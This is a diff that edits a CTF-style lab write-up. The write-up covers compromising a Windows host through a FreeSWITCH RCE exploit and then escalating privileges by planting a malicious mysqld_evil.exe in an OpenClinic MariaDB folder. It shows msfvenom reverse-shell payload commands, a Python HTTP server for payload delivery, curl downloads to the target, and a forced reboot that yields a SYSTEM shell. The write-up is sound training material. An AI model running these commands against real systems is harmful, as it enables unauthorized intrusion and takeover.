@@ -26,11 +26,11 @@ My initial scan returned very few open ports, so I performed a full port sweep u
 nmap -p- $TARGET
 ```
 
-![nmap -p- on target](media/01.png)
-
 There were two open ports:
 * 3389 with ms-wbt-server (RDP)
 * 8021 with ftp-proxy
+
+![nmap -p- on target](media/01.png)
 
 Since no web service was exposed, I continued enumeration by running default scripts and service detection against each port individually.
 
@@ -54,7 +54,8 @@ This revealed that the service running on port `8021` was `FreeSWITCH`,which pro
 
 ![svc on 8021](media/03.png)
 
-Searching for `FreeSWITCH` in `searchsploit` returned two available exploits. I chose to proceed with the non‑Metasploit PoC to better understand the vulnerability and maintain a manual workflow.
+Searching for `FreeSWITCH` in `searchsploit` returned two available exploits.    
+I chose to proceed with the non‑Metasploit PoC to better understand the vulnerability and maintain a manual workflow.
 
 ![freeswitch search results](media/04.png)
 
@@ -68,9 +69,9 @@ searchploit -m 4779
 
 #### Exploitation
 
-With the exploit downloaded, I reviewed the PoC and executed it with `python3` to understand its behavior.
+With the exploit downloaded, I reviewed the PoC and executed it with `python3`.
 
-The script provided RCE on the target, and I confirmed successful code execution by running `whoami`, which returned the user `nekrotic`.
+The script promised RCE on the target, and I confirmed successful code execution by running `whoami`, which returned the user `nekrotic`.
 
 ![whoami rce](media/06.png)
 
@@ -84,7 +85,7 @@ I ended up finding the user flag on Nekrotic's Desktop.
 ![dir listing of desktop](media/08.png)     
 ![more on user.txt](media/09.png)
 
-While reviewing the contents of `C:\`, I noticed a folder named `projects`. Its lowercase naming stood out from the typical Windows directory conventions, suggesting it may have been created manually by a user rather than by the system.
+While reviewing the contents of `C:\`, I noticed a folder named `projects`, that stood out due to its lowercase naming, suggesting it may have been created by a user rather than by the system.
 
 Inside this folder, I found a single directory named `openclinic`.
 
@@ -98,7 +99,7 @@ Searching for `openclinic` returned an exploit that specifically targeted the ap
 
 ![openclinic on searchploit](media/12.png)
 
-#### Privilege EScalation
+#### Privilege Escalation
 
 I downloaded the exploit to my machine using:
 
@@ -113,16 +114,15 @@ This was the point where I initially lost significant time, as I assumed the iss
 
 ![PoC](media/14.png)
 
-Following the structure of the PoC, I generated a payload and used it to establish a more reliable session as nekrotic.     
-I then saved it in a dedicated directory named `payload` and stored it under the filename `reverse‑shell`.
+Following the structure of the PoC, I generated a payload and used it to establish a more reliable session as nekrotic.    
+
+I then saved it in a dedicated directory named `payload`, stored under the filename `reverse‑shell`.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > root/payload/reverse-shell
 ```
 
 ![what i said above...](media/15.png)
-
-After that I changed directpries to /root/payload and used python to serve the folder to the network on port 8080
 
 After preparing the payload, I moved into the directory where it was stored and made it accessible to the target by serving the folder over the network, for that, I used a simple built‑in `Python` module to start an `HTTP server` on port `8080`, allowing the target system to retrieve the file directly.
 
@@ -132,7 +132,7 @@ python3 -m http.server 8080
 
 ![me serving, you go girl](media/16.png)
 
-After making the payload available over `HTTP`, I used the previously obtained RCE to retrieve it onto the target system using the `curl` command.
+Now that the payload was available over `HTTP`, I used the previously obtained RCE to retrieve it onto the target system using the `curl` command.
 
 ```bash
 curl http://<IP>:<PORT>/revserse-shell -o "C:\projects\wrs.exe"
@@ -149,13 +149,13 @@ C:\projects\wrs.exe
 
 ![revserse shell payload on target](media/17.png)
 
-After the stable shell connected back to my listener, I returned to my attacking machine to prepare the privilege‑escalation payload described in the PoC, generating this new payload following the naming convention and structure outlined and ensuring it matched what the exploit expected.
+After the stable shell connected back to my listener, I returned to my attacking machine to prepare the privilege‑escalation payload described in the PoC, generating this new payload following the naming convention and structure outlined.
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /var/www/html/mysqld_evil.exe
 ```
 
-With the payload created, I moved into the directory used for serving files and made it accessible to the target using `Python`.
+With the payload created, I moved into `/var/www/html/` and used `Python` to serve it to the network.
 
 ```python
 python3 -m http.server 8080
@@ -163,11 +163,7 @@ python3 -m http.server 8080
 
 ![payload creatiton and serving](media/18.png)
 
-now as nekrotic on the reverseh shell i had set up i used curl t download the payload into C:\projects\openclinic\mariadb\bin
-
-
-Now that I had a stable shell as nekrotic, I used it to retrieve the LPE payload from my HTTP server.       
-I downloaded it directly into `C:\projects\openclinic\mariadb\bin`.
+Now that I had a stable shell as nekrotic, I used it to retrieve the LPE payload from my HTTP server, downloading it directly into `C:\projects\openclinic\mariadb\bin`.
 
 ```powershell
 curl http://<IP>:<PORT>/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
@@ -189,8 +185,6 @@ shutdown /r /t 1
 ```
 
 ![restart](media/22.png)
-
-After a couple seconds, the listenr i set up for this shell picked up the connection as nt authority/system
 
 Once the system rebooted, the listener I had prepared for this stage received a new connection.
 
